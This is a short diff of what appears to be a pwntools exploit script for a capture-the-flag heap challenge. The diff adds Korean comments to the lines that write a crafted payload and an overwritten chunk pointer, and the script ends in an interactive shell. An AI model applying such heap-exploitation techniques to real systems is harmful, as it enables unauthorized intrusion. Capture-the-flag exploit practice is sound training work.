@@ -163,7 +163,7 @@ print(hex(len(pay)))
 assert len(pay) == 0xe0
 
 get_dog(1)
-pet_dog(1, pay)
-pet_cat(12, p64(chunk + 0x4d0))
+pet_dog(1, pay) # 담아뒀다가
+pet_cat(12, p64(chunk + 0x4d0)) # stdout에 쓰기
 
 p.interactive()
